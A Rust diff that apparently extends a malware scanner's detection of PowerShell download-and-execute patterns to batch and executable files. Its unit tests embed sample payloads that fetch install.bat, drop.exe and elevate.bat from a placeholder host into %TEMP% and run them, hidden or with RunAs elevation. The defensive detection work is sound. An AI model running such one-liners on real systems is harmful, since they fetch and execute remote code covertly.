@@ -541,17 +541,44 @@ fn ps_downloaded_script_execution_cmd(statement: &str, dst: &str) -> Option<Stri
             continue;
         }
         if contains_script_invocation(&lower_segment, script_kind) {
-            return Some(segment.trim().trim_matches(['"', '\'']).trim().to_string());
+            let segment = strip_matching_outer_segment_quotes(segment.trim()).trim();
+            let segment = strip_unmatched_trailing_segment_double_quote(segment).trim();
+            return Some(segment.to_string());
         }
         search_start = pos + lower_dst.len();
     }
     None
 }
 
+fn strip_matching_outer_segment_quotes(s: &str) -> &str {
+    let bytes = s.as_bytes();
+    if bytes.len() >= 2
+        && matches!(bytes.first(), Some(b'"' | b'\''))
+        && bytes.first() == bytes.last()
+    {
+        &s[1..s.len() - 1]
+    } else {
+        s
+    }
+}
+
+fn strip_unmatched_trailing_segment_double_quote(s: &str) -> &str {
+    let Some(prefix) = s.strip_suffix('"') else {
+        return s;
+    };
+    if prefix.as_bytes().contains(&b'"') {
+        s
+    } else {
+        prefix
+    }
+}
+
 #[derive(Copy, Clone)]
 enum PsDownloadedScriptKind {
     PowerShell,
     ScriptHost,
+    Batch,
+    Executable,
 }
 
 fn destination_script_kind(dst: &str) -> Option<PsDownloadedScriptKind> {
@@ -569,10 +596,24 @@ fn destination_script_kind(dst: &str) -> Option<PsDownloadedScriptKind> {
     {
         return Some(PsDownloadedScriptKind::ScriptHost);
     }
+    if dst.ends_with(".bat") || dst.ends_with(".cmd") {
+        return Some(PsDownloadedScriptKind::Batch);
+    }
+    if dst.ends_with(".exe") || dst.ends_with(".scr") || dst.ends_with(".com") {
+        return Some(PsDownloadedScriptKind::Executable);
+    }
     None
 }
 
 fn contains_script_invocation(lower_segment: &str, script_kind: PsDownloadedScriptKind) -> bool {
+    if lower_segment.split(is_command_token_boundary).any(|token| {
+        matches!(
+            token,
+            "start-process" | "saps" | "start" | "start-process.exe"
+        )
+    }) {
+        return true;
+    }
     lower_segment.split(is_command_token_boundary).any(|token| {
         matches!(
             (script_kind, token),
@@ -582,7 +623,11 @@ fn contains_script_invocation(lower_segment: &str, script_kind: PsDownloadedScri
             ) | (
                 PsDownloadedScriptKind::ScriptHost,
                 "wscript" | "wscript.exe" | "cscript" | "cscript.exe"
-            )
+            ) | (PsDownloadedScriptKind::Batch, "cmd" | "cmd.exe" | "call")
+                | (
+                    PsDownloadedScriptKind::Executable,
+                    "cmd" | "cmd.exe" | "call"
+                )
         )
     })
 }
@@ -9689,6 +9734,88 @@ powershell -ExecutionPolicy Bypass -File "%TEMP%\Install.ps1"
                 )
             }),
             "downloaded PowerShell -File execution was not linked to source URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_downloaded_batch_start_process_emits_url_argument() {
+        let payload = br#"(New-Object System.Net.WebClient).DownloadFile('https://script-exec.example/install.bat', '%TEMP%\Install.bat'); Start-Process -FilePath '%TEMP%\Install.bat'""#.to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if url == "https://script-exec.example/install.bat"
+                            && cmd.contains("Start-Process -FilePath")
+                            && cmd.contains("'%TEMP%\\Install.bat'")
+                )
+            }),
+            "downloaded batch Start-Process execution was not linked to source URL: {:?}",
+            env.traits
+        );
+        assert_eq!(
+            env.traits
+                .iter()
+                .filter(|t| matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { url, .. }
+                        if url == "https://script-exec.example/install.bat"
+                ))
+                .count(),
+            1,
+            "wrapper-quote variants should dedupe: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_downloaded_exe_start_process_emits_url_argument() {
+        let payload = br#"Invoke-WebRequest -Uri 'https://script-exec.example/drop.exe' -OutFile '%TEMP%\drop.exe'; Start-Process '%TEMP%\drop.exe' -WindowStyle Hidden"#.to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if url == "https://script-exec.example/drop.exe"
+                            && cmd.contains("Start-Process")
+                            && cmd.contains("'%TEMP%\\drop.exe'")
+                )
+            }),
+            "downloaded exe Start-Process execution was not linked to source URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_downloaded_batch_cmd_argumentlist_emits_url_argument() {
+        let payload = br#"Invoke-WebRequest -Uri 'https://script-exec.example/elevate.bat' -OutFile '%TEMP%\elevate.bat'; Start-Process cmd -ArgumentList '/c %TEMP%\elevate.bat' -Verb RunAs"#.to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if url == "https://script-exec.example/elevate.bat"
+                            && cmd.contains("Start-Process cmd")
+                            && cmd.contains("'/c %TEMP%\\elevate.bat'")
+                )
+            }),
+            "downloaded batch cmd ArgumentList execution was not linked to source URL: {:?}",
             env.traits
         );
     }
